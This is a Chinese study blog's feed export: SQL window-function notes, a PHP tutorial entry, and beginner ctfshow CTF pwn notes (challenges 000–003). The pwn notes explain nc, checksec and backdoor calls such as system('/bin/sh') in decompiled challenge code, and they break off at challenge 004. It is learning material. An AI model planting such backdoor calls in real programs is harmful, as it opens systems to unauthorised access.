<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span></span><br><span class="line">  id,</span><br><span class="line">  name,</span><br><span class="line">  age,</span><br><span class="line">  score,</span><br><span class="line">  class_id,</span><br><span class="line">  <span class="built_in">AVG</span>(score) <span class="keyword">OVER</span> (<span class="keyword">PARTITION</span> <span class="keyword">BY</span> class_id) </span><br><span class="line">  <span class="keyword">AS</span> class_avg_score</span><br><span class="line"><span class="keyword">from</span> student</span><br></pre></td></tr></table></figure>
<h3 id="27-查询进阶-开窗函数-sum-over-order-by"><a class="header-anchor" href="#27-查询进阶-开窗函数-sum-over-order-by">¶</a>27 查询进阶-开窗函数-sum over order by</h3>
<ul>
<li>
<p>sum over order by，可以实现同组内数据的 <strong>累加求和</strong> 。</p>
<p>示例用法如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="built_in">SUM</span>(计算字段名) <span class="keyword">OVER</span> (<span class="keyword">PARTITION</span> <span class="keyword">BY</span> 分组字段名 <span class="keyword">ORDER</span> <span class="keyword">BY</span> 排序字段 排序规则)</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>举一个应用场景：老师在每个班级里依次点名，每点到一个学生，老师都会记录当前已点到的学生们的分数总和。（？跟SUM有啥区别</p>
</li>
<li>
<p>计算每个客户的历史订单累计金额，并显示每个订单的详细信息。</p>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> </span><br><span class="line">    order_id, </span><br><span class="line">    customer_id, </span><br><span class="line">    order_date, </span><br><span class="line">    total_amount,</span><br><span class="line">    <span class="built_in">SUM</span>(total_amount) <span class="keyword">OVER</span> (<span class="keyword">PARTITION</span> <span class="keyword">BY</span> customer_id <span class="keyword">ORDER</span> <span class="keyword">BY</span> order_date <span class="keyword">ASC</span>) <span class="keyword">AS</span> cumulative_total_amount</span><br><span class="line"><span class="keyword">FROM</span></span><br><span class="line">    orders;</span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> id, name, age, score, class_id, </span><br><span class="line">		<span class="built_in">SUM</span>(score) <span class="keyword">OVER</span> </span><br><span class="line">		(<span class="keyword">PARTITION</span> <span class="keyword">BY</span> class_id <span class="keyword">ORDER</span> <span class="keyword">BY</span> score <span class="keyword">ASC</span>) <span class="keyword">AS</span> class_sum_score </span><br><span class="line"><span class="keyword">from</span> student</span><br></pre></td></tr></table></figure>
<ul>
<li>这个知识点有点不熟练ORZ</li>
</ul>
<h3 id="28-查询进阶-开窗函数-rank"><a class="header-anchor" href="#28-查询进阶-开窗函数-rank">¶</a>28 查询进阶-开窗函数-rank</h3>
<ul>
<li>
<p>开窗函数 Rank</p>
</li>
<li>
<p>Rank 开窗函数是 SQL 中一种用于对查询结果集中的行进行 <strong>排名</strong> 的开窗函数。它可以根据指定的列或表达式对结果集中的行进行排序，并为每一行分配一个排名。在排名过程中，相同的值将被赋予相同的排名，而不同的值将被赋予不同的排名。</p>
<blockquote>
<p>当存在并列（相同排序值）时，Rank 会跳过后续排名，并保留相同的排名。</p>
</blockquote>
<ul>
<li>
<p>Rank 开窗函数的常见用法是在查询结果中查找前几名（Top N）或排名最高的行。</p>
</li>
<li>
<p>Rank 开窗函数的语法如下：</p>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="built_in">RANK</span>() <span class="keyword">OVER</span> (</span><br><span class="line">  <span class="keyword">PARTITION</span> <span class="keyword">BY</span> 列名<span class="number">1</span>, 列名<span class="number">2</span>, ... <span class="comment">-- 可选，用于指定分组列</span></span><br><span class="line">  <span class="keyword">ORDER</span> <span class="keyword">BY</span> 列名<span class="number">3</span> [<span class="keyword">ASC</span><span class="operator">|</span><span class="keyword">DESC</span>], 列名<span class="number">4</span> [<span class="keyword">ASC</span><span class="operator">|</span><span class="keyword">DESC</span>], ... <span class="comment">-- 用于指定排序列及排序方式</span></span><br><span class="line">) <span class="keyword">AS</span> rank_column</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>其中，<code>PARTITION BY</code> 子句可选，用于指定分组列，将结果集按照指定列进行分组；<code>ORDER BY</code> 子句用于指定排序列及排序方式，决定了计算 Rank 时的排序规则。<code>AS rank_column</code> 用于指定生成的 Rank 排名列的别名。</p>
</li>
<li>
<p>为每个客户的订单按照订单金额降序排名，并显示每个订单的详细信息。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> </span><br><span class="line">    order_id, </span><br><span class="line">    customer_id, </span><br><span class="line">    order_date, </span><br><span class="line">    total_amount,</span><br><span class="line">    <span class="built_in">RANK</span>() <span class="keyword">OVER</span> (<span class="keyword">PARTITION</span> <span class="keyword">BY</span> customer_id <span class="keyword">ORDER</span> <span class="keyword">BY</span> total_amount <span class="keyword">DESC</span>) <span class="keyword">AS</span> customer_rank</span><br><span class="line"><span class="keyword">FROM</span></span><br><span class="line">    orders;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> id, name, age, score, class_id, <span class="built_in">RANK</span>() <span class="keyword">OVER</span> (<span class="keyword">PARTITION</span> <span class="keyword">BY</span> class_id <span class="keyword">ORDER</span> <span class="keyword">BY</span> score <span class="keyword">DESC</span>) <span class="keyword">AS</span> ranking <span class="keyword">from</span> student</span><br></pre></td></tr></table></figure>
<h3 id="29-查询进阶-开窗函数-row-number"><a class="header-anchor" href="#29-查询进阶-开窗函数-row-number">¶</a>29 查询进阶-开窗函数-row_number</h3>
<ul>
<li>
<p>Row_Number 开窗函数是 SQL 中的一种用于为查询结果集中的每一行 <strong>分配唯一连续排名</strong> 的开窗函数</p>
</li>
<li>
<p>与之前讲到的 Rank 函数不同，Row_Number 函数为每一行都分配一个唯一的整数值，不管是否存在并列（相同排序值）的情况。每一行都有一个唯一的行号，从 1 开始连续递增。</p>
<p>Row_Number 开窗函数的语法如下（几乎和 Rank 函数一模一样）：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ROW_NUMBER</span>() <span class="keyword">OVER</span> (</span><br><span class="line">  <span class="keyword">PARTITION</span> <span class="keyword">BY</span> column1, column2, ... <span class="comment">-- 可选，用于指定分组列</span></span><br><span class="line">  <span class="keyword">ORDER</span> <span class="keyword">BY</span> column3 [<span class="keyword">ASC</span><span class="operator">|</span><span class="keyword">DESC</span>], column4 [<span class="keyword">ASC</span><span class="operator">|</span><span class="keyword">DESC</span>], ... <span class="comment">-- 用于指定排序列及排序方式</span></span><br><span class="line">) <span class="keyword">AS</span> row_number_column</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>其中，<code>PARTITION BY</code>子句可选，用于指定分组列，将结果集按照指定列进行分组。<code>ORDER BY</code> 子句用于指定排序列及排序方式，决定了计算 Row_Number 时的排序规则。<code>AS row_number_column</code> 用于指定生成的行号列的别名。</p>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> id, name, age, score, class_id, <span class="built_in">ROW_NUMBER</span>() <span class="keyword">OVER</span>(</span><br><span class="line">    <span class="keyword">PARTITION</span> <span class="keyword">BY</span> class_id <span class="keyword">ORDER</span> <span class="keyword">BY</span> score <span class="keyword">DESC</span></span><br><span class="line">) <span class="keyword">AS</span> row_number <span class="keyword">from</span> student</span><br></pre></td></tr></table></figure>
<h3 id="30-查询进阶-开窗函数-lag-lead"><a class="header-anchor" href="#30-查询进阶-开窗函数-lag-lead">¶</a>30 查询进阶-开窗函数-lag/lead</h3>
<p>开窗函数 Lag 和 Lead 的作用是获取在当前行之前或之后的行的值，这两个函数通常在需要<strong>比较相邻行</strong>数据或<strong>进行时间序列分析</strong>时非常有用。</p>
<ul>
<li>1）Lag 函数</li>
</ul>
<p>Lag 函数用于获取 <strong>当前行之前</strong> 的某一列的值。它可以帮助我们查看上一行的数据。</p>
<p>Lag 函数的语法如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="built_in">LAG</span>(column_name, <span class="keyword">offset</span>, default_value) <span class="keyword">OVER</span> (<span class="keyword">PARTITION</span> <span class="keyword">BY</span> partition_column <span class="keyword">ORDER</span> <span class="keyword">BY</span> sort_column)</span><br></pre></td></tr></table></figure>
<p>参数解释：</p>
<ul>
<li>
<p><code>column_name</code>：要获取值的列名。</p>
</li>
<li>
<p><code>offset</code>：表示要向上偏移的行数。例如，offset为1表示获取上一行的值，offset为2表示获取上两行的值，以此类推。</p>
</li>
<li>
<p><code>default_value</code>：可选参数，用于指定当没有前一行时的默认值。</p>
</li>
<li>
<p><code>PARTITION BY</code>和<code>ORDER BY</code>子句可选，用于分组和排序数据。</p>
</li>
<li>
<p>2）Lead 函数</p>
</li>
</ul>
<p>Lead 函数用于获取 <strong>当前行之后</strong> 的某一列的值。它可以帮助我们查看下一行的数据。</p>
<p>Lead 函数的语法如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="built_in">LEAD</span>(column_name, <span class="keyword">offset</span>, default_value) <span class="keyword">OVER</span> (<span class="keyword">PARTITION</span> <span class="keyword">BY</span> partition_column <span class="keyword">ORDER</span> <span class="keyword">BY</span> sort_column)</span><br></pre></td></tr></table></figure>
<p>参数解释：</p>
<ul>
<li>
<p><code>column_name</code>：要获取值的列名。</p>
</li>
<li>
<p><code>offset</code>：表示要向下偏移的行数。例如，offset为1表示获取下一行的值，offset为2表示获取下两行的值，以此类推。</p>
</li>
<li>
<p><code>default_value</code>：可选参数，用于指定当没有后一行时的默认值。</p>
</li>
<li>
<p><code>PARTITION BY</code>和<code>ORDER BY</code>子句可选，用于分组和排序数据。</p>
</li>
<li>
<p>例：查询每个学生的考试日期和上一次考试的成绩，以及下一次考试的成绩，示例 SQL 如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> </span><br><span class="line">    student_id,</span><br><span class="line">    exam_date,</span><br><span class="line">    score,</span><br><span class="line">    <span class="built_in">LAG</span>(score, <span class="number">1</span>, <span class="keyword">NULL</span>) <span class="keyword">OVER</span> (<span class="keyword">PARTITION</span> <span class="keyword">BY</span> student_id <span class="keyword">ORDER</span> <span class="keyword">BY</span> exam_date) <span class="keyword">AS</span> previous_score,</span><br><span class="line">    <span class="built_in">LEAD</span>(score, <span class="number">1</span>, <span class="keyword">NULL</span>) <span class="keyword">OVER</span> (<span class="keyword">PARTITION</span> <span class="keyword">BY</span> student_id <span class="keyword">ORDER</span> <span class="keyword">BY</span> exam_date) <span class="keyword">AS</span> next_score</span><br><span class="line"><span class="keyword">FROM</span></span><br><span class="line">    scores;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> id, name, age, score, class_id,</span><br><span class="line">        <span class="built_in">LAG</span>(name, <span class="number">1</span>, <span class="keyword">NULL</span>) <span class="keyword">OVER</span> (<span class="keyword">PARTITION</span> <span class="keyword">BY</span> class_id <span class="keyword">ORDER</span> <span class="keyword">BY</span> score <span class="keyword">DESC</span>) <span class="keyword">AS</span> prev_name,</span><br><span class="line">        <span class="built_in">LEAD</span>(name, <span class="number">1</span>, <span class="keyword">NULL</span>) <span class="keyword">OVER</span> (<span class="keyword">PARTITION</span> <span class="keyword">BY</span> class_id <span class="keyword">ORDER</span> <span class="keyword">BY</span> score <span class="keyword">DESC</span>) <span class="keyword">AS</span> next_name</span><br><span class="line"> <span class="keyword">from</span> student</span><br></pre></td></tr></table></figure>
<ul>
<li>P.S. 这题居然一次过，好感动T T</li>
</ul>
<h3 id="恭喜通关！"><a class="header-anchor" href="#恭喜通关！">¶</a>恭喜通关！</h3>
<h3 id="写在后面"><a class="header-anchor" href="#写在后面">¶</a>写在后面</h3>
<p>比第一次刷熟练多了，第一次刚学了一遍，后半部分都需要参考答案才能写出来，这回只有个别题卡了一下，其余的都挺顺利</p>
<p>复习SQL命令的好方式~</p>
]]></content>
      <categories>
        <category>notes</category>
        <category>SQL notes</category>
      </categories>
      <tags>
        <tag>CS Notes</tag>
        <tag>Database</tag>
      </tags>
  </entry>
  <entry>
    <title>【PHP】整理版教程</title>
    <url>/project/2024/07/23/CS_Notes/PHP/%E3%80%90PHP%E3%80%91%E6%95%B4%E7%90%86%E7%89%88%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<h3 id="写在前面"><a class="header-anchor" href="#写在前面">¶</a>写在前面</h3>
<p>一份来自w3cschools的PHP教程文档</p>
<h3 id="由此始"><a class="header-anchor" href="#由此始">¶</a>由此始</h3>

	<iframe src="https://www.slideshare.net/slideshow/embed_code/key/sXtNQhrXh8ymV8?hostedIn=slideshare&amp;page=upload" style="width:100%;height:550px" frameborder="0" marginwidth="0" marginheight="0" scrolling="no" allowfullscreen> </iframe> <div style="margin-bottom:5px">

</div>]]></content>
      <categories>
        <category>notes</category>
        <category>PHP notes</category>
      </categories>
      <tags>
        <tag>CS Notes</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>【Pvvn】000-036知识点记录</title>
    <url>/project/2024/07/17/CS_Notes/PWN/%E3%80%90Pvvn%E3%80%91000-036%E7%9F%A5%E8%AF%86%E7%82%B9%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h3 id="写在前面"><a class="header-anchor" href="#写在前面">¶</a>写在前面</h3>
<ul>
<li>刚做完一遍，跟着vvp。基本流程是知道个七七八八了，这回重新把每道题看过去，提取一下知识点。为苯白痴量身制作的vvp白痴解释版思密达QwQ顺便复习（预习C语言</li>
</ul>
<p>vvp的链接：<a href="https://brocademaple.github.io/2024/07/16/CS_Notes/PWN/%5BPwn%5Dwp%E5%AD%98%E6%A1%A3/">【Puun】uup留档 | BROCADEMAPLE</a></p>
<h3 id="000-ssh连接的彩蛋题"><a class="header-anchor" href="#000-ssh连接的彩蛋题">¶</a>000 ssh连接的彩蛋题</h3>
<h4 id="什么是ssh连接"><a class="header-anchor" href="#什么是ssh连接">¶</a>什么是ssh连接</h4>
<ul>
<li>SSH（Secure Shell）是一种加密的网络协议，用于安全地访问远程计算机。</li>
<li>它提供了一个安全的渠道，允许用户在本地计算机上执行远程计算机上的命令，就像直接在远程计算机上操作一样。</li>
<li>SSH使用公钥加密技术来验证远程计算机和用户的身份，并为数据传输提供加密</li>
</ul>
<h4 id="什么是shell"><a class="header-anchor" href="#什么是shell">¶</a>什么是shell</h4>
<ol>
<li><strong>命令行界面</strong>：Shell是一个命令行界面（CLI），允许用户输入命令并接收输出结果。</li>
<li><strong>脚本执行</strong>：Shell可以执行脚本，这些脚本是一系列命令的集合，可以自动化任务。</li>
<li><strong>环境变量</strong>：Shell允许用户设置和使用环境变量，这些变量可以影响程序的行为。</li>
<li><strong>管道和重定向</strong>：Shell支持管道操作，可以将一个命令的输出作为另一个命令的输入。同时，Shell也支持输入输出的重定向。</li>
<li><strong>权限和安全</strong>：Shell执行的命令受到用户权限的限制。在安全方面，Shell需要正确配置以防止未授权访问。</li>
</ol>
<h4 id="在shell中输入id"><a class="header-anchor" href="#在shell中输入id">¶</a>在shell中输入id</h4>
<ul>
<li><code>id</code>命令用于显示当前用户的信息，包括用户ID（UID）、组ID（GID）以及其他所属的组。</li>
<li>在CTF赛题中，这可以帮助参赛者了解他们以哪个用户的身份登录，以及该用户具有哪些权限</li>
</ul>
<h4 id="ls-区别于ls的作用"><a class="header-anchor" href="#ls-区别于ls的作用">¶</a>ls /区别于ls的作用</h4>
<ul>
<li><code>ls</code>命令用于列出目录中的文件和子目录。不加任何参数时，默认列出当前目录的内容。</li>
<li><code>ls /</code>命令列出的是根目录（<code>/</code>）的内容。根目录是文件系统的最顶层目录，包含了所有其他目录和文件。这可以帮助参赛者了解服务器的文件系统结构。</li>
<li>通常，<code>ls</code>命令会列出<em><strong>当前工作目录</strong></em>的内容，而<code>ls /</code>则是列出<em><strong>根目录</strong></em>的内容，两者的区别在于它们指定的目录不同</li>
</ul>
<h3 id="001-nc连接-后门函数"><a class="header-anchor" href="#001-nc连接-后门函数">¶</a>001 nc连接+后门函数</h3>
<h4 id="什么是nc连接"><a class="header-anchor" href="#什么是nc连接">¶</a>什么是nc连接</h4>
<ul>
<li><code>nc</code>（Netcat）是一个用于网络工具，可以用于读写网络连接，使用TCP或UDP协议。它可以用来创建监听在特定端口的服务器，也可以用来发起连接到远程服务器的客户端。<code>nc</code>因其简单性和灵活性，在网络安全领域被广泛用于测试网络服务和进行端口扫描</li>
</ul>
<h4 id="nc连接和ssh连接的关联和区别"><a class="header-anchor" href="#nc连接和ssh连接的关联和区别">¶</a>nc连接和ssh连接的关联和区别</h4>
<ul>
<li><strong>关联</strong>：<code>nc</code>可以用来创建一个简单的SSH连接，例如，使用<code>nc</code>监听本地端口并转发到远程主机的SSH端口，实现端口转发。</li>
<li><strong>区别</strong>：
<ul>
<li><strong>协议</strong>：SSH是一种加密的网络协议，专为安全访问远程计算机而设计；而<code>nc</code>是一个更为通用的网络工具，不提供加密功能。</li>
<li><strong>安全性</strong>：SSH提供了加密和身份验证机制，确保数据传输的安全性；<code>nc</code>则不加密数据，容易受到中间人攻击。</li>
<li><strong>用途</strong>：SSH主要用于远程登录和命令执行，而<code>nc</code>可以用于更广泛的网络通信任务，如端口扫描、数据传输等。</li>
</ul>
</li>
</ul>
<h4 id="checksec"><a class="header-anchor" href="#checksec">¶</a>checksec</h4>
<ul>
<li><code>checksec</code>是一个用于分析程序二进制文件的安全特性的工具，它可以帮助user了解程序的内存保护机制，例如栈保护（<strong>Stack Canaries</strong>）、地址空间布局随机化（<strong>ASLR</strong>）、非执行栈（<strong>NoExecStack</strong>）、符号表剥离（<strong>NX</strong>）等。</li>
<li>在CTF的Pwn（二进制漏洞利用）方向中，了解这些安全特性对于找到漏洞和制定利用策略至关重要</li>
</ul>
<h4 id="system-“cat-ctfshow-flag”-是后门函数的原因"><a class="header-anchor" href="#system-“cat-ctfshow-flag”-是后门函数的原因">¶</a>system(“cat /ctfshow_flag”)是后门函数的原因</h4>
<ul>
<li><code>system</code>函数是C语言标准库中的一个函数，它允许调用shell命令。</li>
<li>如果一个程序中存在<code>system(&quot;cat /ctfshow_flag&quot;)</code>这样的代码，它实际上是在调用系统shell来执行<code>cat /ctfshow_flag</code>命令，这通常不是一个正常的程序行为，而是故意留下的后门</li>
</ul>
<h4 id="后门函数"><a class="header-anchor" href="#后门函数">¶</a>后门函数</h4>
<ul>
<li>
<p>后门函数是指在软件中故意或无意留下的代码，允许未经授权的用户绕过正常的认证和授权机制，获得对系统的访问权限或执行特定的操作。后门可以是一段代码、一个配置设置，或者是一个隐藏的接口。在CTF比赛中，找到并利用后门是获取Flag的一种常见策略。</p>
</li>
<li>
<p>在比赛中，参赛者需要利用程序的漏洞来执行任意代码，而后门函数如<code>system</code>可以被用来执行特定的命令，如读取Flag文件。</p>
</li>
<li>
<p>然而，使用后门函数通常需要找到一种方法来绕过程序的正常逻辑，这可能涉及到溢出、格式化字符串攻击等技术</p>
</li>
</ul>
<h4 id="在本地写入一个flag文件作为测试"><a class="header-anchor" href="#在本地写入一个flag文件作为测试">¶</a>在本地写入一个flag文件作为测试</h4>
<p><code>echo &quot;flag&#123;just_test_my_process! &#125;&quot;&gt;/c|t|f|s|h|o|w_flag</code></p>
<p>然后运行pvvn程序，可以得到本地写入的flag值</p>
<p>后面的题中，在连接远程环境之前，可以先本地运行pvvn文件，测试能否得到这个flag值</p>
<h3 id="002-shell-分析c代码"><a class="header-anchor" href="#002-shell-分析c代码">¶</a>002 shell+分析c代码</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[*] <span class="string">&#x27;/home/ctfshow/Desktop/ctfshow-pwn-primary/pwn002/pwn&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<p>64位程序，仅关闭canary</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span> &#123;</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  logo();  <span class="comment">// 显示logo</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; Now, you can use &#x27;cat /ctfshow_flag&#x27; to get flag! &quot;</span>);</span><br><span class="line">  system(<span class="string">&quot;/bin/sh&quot;</span>);  <span class="comment">// 后门函数，给了一个shell</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 这段代码设计了一个程序，启动时会调整一些I/O缓冲设置，展示一个欢迎信息，并最终提供一个交互式shell，暗示用户可以通过特定命令获取某个“flag”</span></span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls -l /bin/sh</span><br><span class="line">... -&gt; dash  // </span><br></pre></td></tr></table></figure>
<h4 id="setvbuf调用"><a class="header-anchor" href="#setvbuf调用">¶</a>setvbuf调用</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">setvbuf(_bss_start, 0LL, 2, 0LL);</span><br><span class="line">setvbuf(stdin, 0LL, 2, 0LL);</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p><code>setvbuf</code>函数用于控制缓冲区行为。这里进行了两次调用，分别针对<code>_bss_start</code>和标准输入<code>stdin</code>。</p>
</li>
<li>
<p><code>_bss_start</code>通常指向未初始化数据段的开始，这里的调用可能意在对程序的BSS段（存放未初始化全局变量和静态变量的部分）进行缓冲区设置。但是，传入的参数（尤其是第二个参数为NULL和第三个参数为2）表明它试图禁用缓冲或使用无缓冲I/O。实际上，直接对_BSS_START进行这样的操作不太常见且可能不正确，因为_BSS_START不是一个标准的文件流。</p>
</li>
<li>
<p>对于<code>stdin</code>的<code>setvbuf</code>调用，它设置了标准输入流为无缓冲I/O（模式2），这意味着从标准输入读取数据时将直接进行，没有缓冲延迟，这对于交互式shell尤其重要。</p>
</li>
</ul>
<h4 id="system-“-bin-sh”-的工作原理"><a class="header-anchor" href="#system-“-bin-sh”-的工作原理">¶</a>system(“/bin/sh”)的工作原理</h4>
<ul>
<li>system()函数先fork一个子进程，在这个子进程中调用/bin/sh -c来执行command指定的命令。</li>
<li>/bin/sh在系统中一般是个软链接，指向dash或者bash等常用的shell，-c选项是告诉shell从字符串</li>
<li>command中读取要执行的命令（shell将扩展command中的任何特殊字符）。父进程则调用waitpid()函数来为变成僵尸的子进程收尸，获得其结束状态，然后将这个结束状态返回给system()函数的调用者</li>
<li>执行完这个后它就会返回一个shell给函数的调用者</li>
<li>system(“cat /ctfshow_flag”);  system(“/bin/sh”);这一类的我们称之为后门函数，再后续利用过程中我们要尽可能找到或者构造出来</li>
</ul>
<h3 id="003-真假命令（一）"><a class="header-anchor" href="#003-真假命令（一）">¶</a>003 真假命令（一）</h3>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[*] level up ! Let&#x27;s go ! </span><br><span class="line">You can call the following function:</span><br><span class="line">1._start</span><br><span class="line">2.main</span><br><span class="line">3.hello_ctfshow</span><br><span class="line">4.ctfshow(&#x27;echo /ctfshow_flag&#x27;)</span><br><span class="line">5.print(&#x27;/ctfshow_flag&#x27;)</span><br><span class="line">6.system(&#x27;cat /ctfshow_flag&#x27;)</span><br><span class="line">7.puts(&#x27;/ctfshow_flag&#x27;)</span><br><span class="line">8.exit</span><br><span class="line">Your choice is :</span><br></pre></td></tr></table></figure>
<p>看起来是这样的，看起来选6，但是真的假的还是得看源代码</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">checksec pwn</span><br><span class="line">[*] &#x27;/home/ctfshow/Desktop/ctfshow-pwn-primary/pwn003/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">64位程序保护全开</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// 变量定义</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> **v3; <span class="comment">// rdx   指针变量v3</span></span><br><span class="line">  <span class="type">char</span> argva[<span class="number">12</span>]; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF  12位的字符数组</span></span><br><span class="line"></span><br><span class="line">  *(_QWORD *)&amp;argva[<span class="number">4</span>] = __readfsqword(<span class="number">0x28</span>u);  <span class="comment">// 这行代码读取了线程信息块(TIB)中的某个地址（通常是栈基址），并将该值存储到argva数组的某个位置</span></span><br><span class="line">  </span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);  <span class="comment">// 调用了setvbuf来改变缓冲区行为，与之前的代码一致，分别为_BSS段和标准输入stdin设置无缓冲I/O</span></span><br><span class="line">   </span><br><span class="line">    </span><br><span class="line">  logo();  <span class="comment">// 美术部分</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[*] level up ! Let&#x27;s go ! &quot;</span>);</span><br><span class="line">  menu();  <span class="comment">// 就是上面的选项列表</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Your choice is :\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, argva);  <span class="comment">// 使用__isoc99_scanf函数从标准输入读取一个整数到argva数组中，作为用户的选择</span></span><br><span class="line">  <span class="keyword">switch</span> ( *(_DWORD *)argva )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;start&quot;</span>);  <span class="comment">// 一眼假</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      main((<span class="type">int</span>)<span class="string">&quot;%d&quot;</span>, (<span class="type">const</span> <span class="type">char</span> **)argva, v3);  <span class="comment">// ai说是递归调用main函数</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Hello CTFshow&quot;</span>);    <span class="comment">// 一眼假</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">      ctfshow();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;/ctfshow_flag&quot;</span>);    <span class="comment">// 一眼假</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">      system_func();  <span class="comment">// 看看这个函数有没有执行</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;/ctfshow_flag&quot;</span>);    <span class="comment">// 一眼假</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);    <span class="comment">// 一眼假</span></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Invalid input&quot;</span>);    <span class="comment">// 一眼假</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"> <span class="type">int</span> <span class="title function_">system_func</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;cat /ctfshow_flag&quot;</span>);</span><br><span class="line">&#125;  <span class="comment">// 看来确实执行了</span></span><br><span class="line"></span><br><span class="line"> <span class="type">int</span> <span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;echo /ctfshow_flag&quot;</span>);</span><br><span class="line">&#125;  <span class="comment">// 执行了，但是只有打印，一眼假</span></span><br></pre></td></tr></table></figure>
<h3 id="004-看C代码"><a class="header-anchor" href="#004-看C代码">¶</a>004 看C代码</h3>
